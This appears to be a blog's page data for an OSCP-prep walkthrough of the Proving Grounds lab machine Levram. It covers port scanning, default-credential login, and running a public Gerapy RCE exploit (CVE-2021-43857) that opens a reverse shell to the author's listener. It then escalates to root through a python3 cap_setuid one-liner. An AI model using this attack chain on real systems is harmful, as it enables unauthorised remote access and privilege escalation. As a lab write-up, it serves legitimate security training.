{"componentChunkName":"component---src-templates-post-template-tsx","path":"/240906/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h2>0. Machine Info</h2>\n<p>Levram is an easy machine from Proving Grounds, and this one is pretty straight forward.</p>\n<h2>1. Recon</h2>\n<ul>\n<li>nmap</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~]\r\n└─$ sudo nmap 192.168.211.24 -T4 -p-       \r\n[sudo] password for hosan: \r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-05 13:13 EDT\r\nNmap scan report for 192.168.211.24\r\nHost is up (0.029s latency).\r\nNot shown: 65533 closed tcp ports (reset)\r\nPORT     STATE SERVICE\r\n22/tcp   open  ssh\r\n8000/tcp open  http-alt\r\n\r\nNmap done: 1 IP address (1 host up) scanned in 10.28 seconds</code></pre></div>\n<ul>\n<li>port 22</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">PORT   STATE SERVICE VERSION\r\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)\r\n| ssh-hostkey: \r\n|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)\r\n|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nAggressive OS guesses: Linux 4.15 - 5.8 (95%), Linux 5.0 - 5.4 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), HP P2000 G3 NAS device (93%)\r\nNo exact OS matches for host (test conditions non-ideal).\r\nNetwork Distance: 4 hops\r\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\r\n\r\nTRACEROUTE (using port 22/tcp)\r\nHOP RTT      ADDRESS\r\n1   28.77 ms 192.168.45.1\r\n2   28.51 ms 192.168.45.254\r\n3   37.19 ms 192.168.251.1\r\n4   37.45 ms 192.168.211.24\r\n\r\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\r\nNmap done: 1 IP address (1 host up) scanned in 5.09 seconds</code></pre></div>\n<ul>\n<li>port 8000</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~]\r\n└─$ sudo nmap 192.168.211.24 -T4 -p8000 -A -sC -sV -Pn\r\n[sudo] password for hosan: \r\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-05 13:21 EDT\r\nNmap scan report for 192.168.211.24\r\nHost is up (0.029s latency).\r\n\r\nPORT     STATE SERVICE  VERSION\r\n8000/tcp open  http-alt WSGIServer/0.2 CPython/3.10.6\r\n|_http-title: Gerapy\r\n|_http-server-header: WSGIServer/0.2 CPython/3.10.6</code></pre></div>\n<p>There is nothing special or common cve with versions above or any interesting interactions. Let’s start with webapp enumeration.</p>\n<h2>2. Initial Foothold</h2>\n<p>I tried a basic admin:admin, and I got in (…)</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 521px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/a4033efa19a4fa8f33483360e61d7009/db56f/levram-1.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 89.58333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACS0lEQVR42p2USW/TUBDH/VVo43hJUme1s9txVrIobaSQFEFFkMrSkjStEokIVSCkqt+AO1xZJXpDiAtX9gvf5s+854DibEI9/PTmjcf/mTfzbEGO5jGLEitw5v3/izAv5g1bhLmQYD7RqqTCbMCmlka6fBP55iHZKfIX4AlZEAlP0FmliE0Jc7Q3aZ/j9soK5aiN0/MLPDz7DF+8Dn+8SAnaSBRasKpd5GpdhDI1RLJ1FJs3YOR3uM2SuARZdWLIRKK4i9GTD+gNPyJevIt8o4Nb90cYn56jR+vx5Cn648cYPTrDncGEfGOUW3vY0LL/WiDM92B/+Ay9/nP4jCq0ZAW19m1sX9/nFWWvdmBWO7Dru1RZA2GqzmcUFyv8W6UnmEGmssd7yGw5kufZr2xlec8cnH6y3nlnhJb00OaIIfZymsRsKORXY9NnEQcpQkMgJBdLKmTXRQpn4Y+xF6kSmrhu1bEVL2AjkOL7VYjsNPOCLJMYdAd6KVBcI7RW0DmOxY/sZYRN3kcx6NjrkGY+BHcPYzkoOltJPJqDlqogkCxxex0s3i3IPjmapFc24AukoahJiJKBjNmAkSjD49WxSXiWIBIyxcvTwQhMTKZroDavITA6gv/oEIHhAwSO+1AHBxyN7ODJgPsWYP6De5D1Ar9mgqzTxVRS2JqcQP/9HvqXl9C/vUaMML6/4WvmxzuUfl1w28XXV4j9fIvopxeQEyXIYXt6ZDIUqwa11YW63VmKb4Vf3SEabd4291DYX0MzL8/Svw3Lclmmgn8ASWRt3bKUz88AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/a4033efa19a4fa8f33483360e61d7009/a59e9/levram-1.webp 192w,\n/static/a4033efa19a4fa8f33483360e61d7009/0ca9f/levram-1.webp 384w,\n/static/a4033efa19a4fa8f33483360e61d7009/222ae/levram-1.webp 521w\"\n              sizes=\"(max-width: 521px) 100vw, 521px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/a4033efa19a4fa8f33483360e61d7009/3b721/levram-1.png 192w,\n/static/a4033efa19a4fa8f33483360e61d7009/66595/levram-1.png 384w,\n/static/a4033efa19a4fa8f33483360e61d7009/db56f/levram-1.png 521w\"\n            sizes=\"(max-width: 521px) 100vw, 521px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/a4033efa19a4fa8f33483360e61d7009/db56f/levram-1.png\"\n            alt=\"levram-1\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>Then, the footer revealed that they have Gerapy 0.9.6 running behind the webapp. Since Subdirectory enumeration didn’t work well, I started to search CVE for Gerapy</p>\n<p>Quick search for CVE:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~]\r\n└─$ searchsploit gerapy          \r\n---------------------------------------------------------------------------------------------- ---------------------------------\r\n Exploit Title                                                                                |  Path\r\n---------------------------------------------------------------------------------------------- ---------------------------------\r\nGerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated)                                    | python/remote/50640.py\r\n---------------------------------------------------------------------------------------------- ---------------------------------\r\nShellcodes: No Results</code></pre></div>\n<p>That’s exactly what we need!</p>\n<p>For this exploit, we need more than one project. But as we can see from the first image, we have no projects right now, so I simply created a project.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 768px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/9471ca89f8d8a207b93866bfc7f30641/a2afc/levram-2.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 25.520833333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA2klEQVR42p2MT0tCQRTF53PF2xVqfxYVUhBRm7SM3lN571Vu/FwimOBC0C/SKo0Q483Mm59zjWlniy78mDPn3HNV9eSSyvEFzWbM82ufLOvR7uTEcUrSznlKclqP3Z08tDrESUbqe0n6gqrW74lqVwzHU2S+rUG7Eo3gthT+/xeyv1ivmC/fUZXzBnu1a0aT2fagtRZblv4MOOcII7r0ftAhEy/4he+qg7MG0eEtb5P5j1lotDYYY3+x8npPsqBDJruC+LowqP3TO6KjGwajqS9YPhZfLD9X/2YDEgVT51VFnWkAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/9471ca89f8d8a207b93866bfc7f30641/a59e9/levram-2.webp 192w,\n/static/9471ca89f8d8a207b93866bfc7f30641/0ca9f/levram-2.webp 384w,\n/static/9471ca89f8d8a207b93866bfc7f30641/dc9b9/levram-2.webp 768w,\n/static/9471ca89f8d8a207b93866bfc7f30641/e2c2f/levram-2.webp 1152w,\n/static/9471ca89f8d8a207b93866bfc7f30641/f3efb/levram-2.webp 1536w,\n/static/9471ca89f8d8a207b93866bfc7f30641/8cffa/levram-2.webp 1914w\"\n              sizes=\"(max-width: 768px) 100vw, 768px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/9471ca89f8d8a207b93866bfc7f30641/3b721/levram-2.png 192w,\n/static/9471ca89f8d8a207b93866bfc7f30641/66595/levram-2.png 384w,\n/static/9471ca89f8d8a207b93866bfc7f30641/fe486/levram-2.png 768w,\n/static/9471ca89f8d8a207b93866bfc7f30641/d2d74/levram-2.png 1152w,\n/static/9471ca89f8d8a207b93866bfc7f30641/e8464/levram-2.png 1536w,\n/static/9471ca89f8d8a207b93866bfc7f30641/a2afc/levram-2.png 1914w\"\n            sizes=\"(max-width: 768px) 100vw, 768px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/9471ca89f8d8a207b93866bfc7f30641/fe486/levram-2.png\"\n            alt=\"levram-2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n  </a>\n    </span></p>\n<p>Then I executed the script, got my shell.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">┌──(hosan㉿kali)-[~/pg/levram]\r\n└─$ python3 50640.py -t 192.168.211.24 -p 8000 -L 192.168.45.230 -P 443\r\n  ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____ \r\n / ___\\ \\   / / ____|   |___ \\ / _ \\___ \\/ |     | || ||___ / ( _ ) ___|___  |\r\n| |    \\ \\ / /|  _| _____ __) | | | |__) | |_____| || |_ |_ \\ / _ \\___ \\  / / \r\n| |___  \\ V / | |__|_____/ __/| |_| / __/| |_____|__   _|__) | (_) |__) |/ /  \r\n \\____|  \\_/  |_____|   |_____|\\___/_____|_|        |_||____/ \\___/____//_/   \r\n                                                                              \r\n\r\nExploit for CVE-2021-43857\r\nFor: Gerapy &lt; 0.9.8\r\n[*] Resolving URL...\r\n[*] Logging in to application...\r\n[*] Login successful! Proceeding...\r\n{'Authorization': 'Token b58db15bafeac901558a5da07b2b894f1f2b7111'}\r\n[*] Getting the project list\r\n[{\"name\": \"exploit\"}]\r\n[{\"name\": \"exploit\"}]\r\n[*] Found project: exploit\r\n[*] Getting the ID of the project to build the URL\r\n[*] Found ID of the project:  1\r\n[*] Setting up a netcat listener\r\nlistening on [any] 443 ...\r\n[*] Executing reverse shell payload\r\n[*] Watchout for shell! :)\r\nconnect to [192.168.45.230] from (UNKNOWN) [192.168.211.24] 55734\r\nbash: cannot set terminal process group (844): Inappropriate ioctl for device\r\nbash: no job control in this shell\r\napp@ubuntu:~/gerapy$ \r\n</code></pre></div>\n<h2>3. PrivEsc to root</h2>\n<p>I executed linpeash.sh, but there were too many potential risks.</p>\n<p>What I tried:</p>\n<ul>\n<li>sudo -l</li>\n<li>kernel exploit</li>\n<li>suid/sgid binary</li>\n</ul>\n<p>Nothing worked. But at last, I found that python3 (as binary) has following (linux-) capability!:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">Files with capabilities (limited to 50):\r\n/snap/core20/1891/usr/bin/ping cap_net_raw=ep\r\n/snap/core20/2318/usr/bin/ping cap_net_raw=ep\r\n/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep\r\n/usr/bin/mtr-packet cap_net_raw=ep\r\n/usr/bin/python3.10 cap_setuid=ep !this one</code></pre></div>\n<p>What is capability then?</p>\n<blockquote>\n<p>Capabilities are useful when you want to restrict your own processes after performing privileged operations (e.g. after setting up chroot and binding to a socket). However, they can be exploited by passing them malicious commands or arguments which are then run as root.</p>\n</blockquote>\n<p>For example, if there is setuid capability bit for a binary allowed, the binary is allowed to change the setuid of it’s process if it is being executed, since cap_setuid=ep is enabled for python3.10!</p>\n<p>It means, we can use import os; os.setuid(0) by executing python from command shell!</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">app@ubuntu:~/gerapy$ python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'\r\n&lt; -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'\r\nwhoami\r\nroot\r\ncat /root/proof.txt\r\n96809490798d8d9d8779af42f6fb0f24</code></pre></div>\n<p>I got root. That’s pretty much it.</p>\n<h2>4. Review</h2>\n<p>Easy enough, fair enough.</p>\n<p>It covered all basic stuffs though (with privesc enumeration)</p>\n<h2>5. Source</h2>\n<ul>\n<li>Proving Grounds</li>\n<li>Me!</li>\n</ul>","frontmatter":{"title":"OSCP Prep: Proving Grounds : Levram","summary":"Solving GLPI machine from Proving Grounds","date":"2024.09.06.","before":"2024.09.01.","after":"2024.09.06.","categories":["C-SEC","proving_grounds","full-machine","ENG"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACS0lEQVR42p2USW/TUBDH/VVo43hJUme1s9txVrIobaSQFEFFkMrSkjStEokIVSCkqt+AO1xZJXpDiAtX9gvf5s+854DibEI9/PTmjcf/mTfzbEGO5jGLEitw5v3/izAv5g1bhLmQYD7RqqTCbMCmlka6fBP55iHZKfIX4AlZEAlP0FmliE0Jc7Q3aZ/j9soK5aiN0/MLPDz7DF+8Dn+8SAnaSBRasKpd5GpdhDI1RLJ1FJs3YOR3uM2SuARZdWLIRKK4i9GTD+gNPyJevIt8o4Nb90cYn56jR+vx5Cn648cYPTrDncGEfGOUW3vY0LL/WiDM92B/+Ay9/nP4jCq0ZAW19m1sX9/nFWWvdmBWO7Dru1RZA2GqzmcUFyv8W6UnmEGmssd7yGw5kufZr2xlec8cnH6y3nlnhJb00OaIIfZymsRsKORXY9NnEQcpQkMgJBdLKmTXRQpn4Y+xF6kSmrhu1bEVL2AjkOL7VYjsNPOCLJMYdAd6KVBcI7RW0DmOxY/sZYRN3kcx6NjrkGY+BHcPYzkoOltJPJqDlqogkCxxex0s3i3IPjmapFc24AukoahJiJKBjNmAkSjD49WxSXiWIBIyxcvTwQhMTKZroDavITA6gv/oEIHhAwSO+1AHBxyN7ODJgPsWYP6De5D1Ar9mgqzTxVRS2JqcQP/9HvqXl9C/vUaMML6/4WvmxzuUfl1w28XXV4j9fIvopxeQEyXIYXt6ZDIUqwa11YW63VmKb4Vf3SEabd4291DYX0MzL8/Svw3Lclmmgn8ASWRt3bKUz88AAAAASUVORK5CYII="},"images":{"fallback":{"src":"/static/a4033efa19a4fa8f33483360e61d7009/11442/levram-1.png","srcSet":"/static/a4033efa19a4fa8f33483360e61d7009/7ea16/levram-1.png 130w,\n/static/a4033efa19a4fa8f33483360e61d7009/6bd34/levram-1.png 261w,\n/static/a4033efa19a4fa8f33483360e61d7009/11442/levram-1.png 521w","sizes":"(min-width: 521px) 521px, 100vw"},"sources":[{"srcSet":"/static/a4033efa19a4fa8f33483360e61d7009/4ddc8/levram-1.webp 130w,\n/static/a4033efa19a4fa8f33483360e61d7009/f4a30/levram-1.webp 261w,\n/static/a4033efa19a4fa8f33483360e61d7009/283bd/levram-1.webp 521w","type":"image/webp","sizes":"(min-width: 521px) 521px, 100vw"}]},"width":521,"height":468}},"publicURL":"/static/a4033efa19a4fa8f33483360e61d7009/levram-1.png"}}}}]}},"pageContext":{"slug":"/240906/"}},"staticQueryHashes":["1523927062"],"slicesMap":{}}